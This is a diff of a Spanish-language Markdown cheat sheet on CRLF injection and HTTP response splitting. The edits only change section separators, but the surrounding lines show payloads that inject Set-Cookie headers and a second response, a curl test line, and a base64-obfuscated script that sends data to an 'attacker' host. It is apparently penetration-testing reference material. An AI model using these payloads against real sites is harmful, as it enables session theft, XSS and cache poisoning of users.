@@ -17,7 +17,7 @@ linked:
 ---
 # CRLF Injection - HTTP Response Splitting
 
-***
+---
 
 ## Split — Forzar fin de headers + segunda respuesta
 
@@ -29,7 +29,7 @@ linked:
 | `?url=ok%0d%0aSet-Cookie:%20a=1%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a<x>` | Set-Cookie + segunda respuesta combinadas | Multi-effect en una sola injección. |
 ^crlfi-split-twores
 
-___
+---
 
 ## Inject Second Response con HTML/JS
 
@@ -64,7 +64,7 @@ curl -i "https://target.com/redirect?url=$PAYLOAD"
 # Proxy/cache puede almacenar split response → impacto masivo.
 ```
 
-___
+---
 
 ## XSS via Response Splitting
 
@@ -77,7 +77,7 @@ ___
 | `<script>eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIvP2M9JytkLm…'))</script>` | Payload base64 ofuscado | WAF filtra strings literales. |
 ^crlfi-split-xss
 
-___
+---
 
 ## Cache Poisoning via Splitting
 
@@ -90,4 +90,4 @@ ___
 | Split en endpoint cacheable (`/static/*`, `/api/public/*`) | Persistencia hasta TTL expiration | Identificar surface cacheable previo. |
 ^crlfi-split-cache
 
-***
+---
